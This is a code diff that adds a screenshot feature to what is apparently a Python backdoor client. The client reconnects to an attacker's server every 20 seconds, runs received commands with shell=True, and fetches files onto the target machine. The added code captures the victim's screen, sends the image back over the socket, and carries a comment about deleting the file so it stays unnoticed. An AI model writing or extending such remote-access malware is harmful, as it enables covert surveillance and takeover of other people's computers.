@@ -7,6 +7,21 @@ import os
 import sys
 import time
 import requests
+from mss.linux import MSS as mss
+
+def reliable_send_image(data):
+    sock.send(data)
+
+def reliable_recv_image():
+    while True:
+        data = b""
+        try:
+            data_recv = sock.recv(1024)
+            data = b"".join([data, data_recv])
+            return data
+        except ValueError:
+            continue
+    
 
 def reliable_send(data):
     print("data {}, type {}, compare {}".format(data, type(data), type(data) is not bytes))
@@ -34,6 +49,17 @@ def downloadFileFromTargetComputer(url):
     file_name = url.split("/")[-1]
     with open(file_name, "wb") as file:
         file.write(get_response.content)
+
+def screenshot():
+    # for others
+    #with mss() as screenshot:
+    #for linux
+    with mss(display=":0.0") as screenshot:
+        print(screenshot)
+        screenshot.shot(output="monitor-1.png")
+        #monitor_1 = screenshot.monitors[1]
+        #screenshot = screenshot.grab(monitor_1)
+        
 
 def connection():
     # ajout d'une tentative de connexion toute les 20 secondes au serveur
@@ -81,6 +107,17 @@ def shell():
                 reliable_send("[+] Downloaded File From Specified URL!")
             except:
                 reliable_send("[-] Faile to Downloade File From Specified URL!")
+        elif len(command) > 1 and command[:10] == "screenshot":
+            try:
+                screenshot()
+                with open("monitor-1.png", "rb") as screen:
+                    reliable_send_image(screen.read())
+                #maintenant on supprime le fichier pour pas qu'il apparaisse
+                #os.remove("monitor-1.png")
+
+            except Exception as error:
+                print(error)
+                reliable_send("[-] We can't take the picture")
 
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
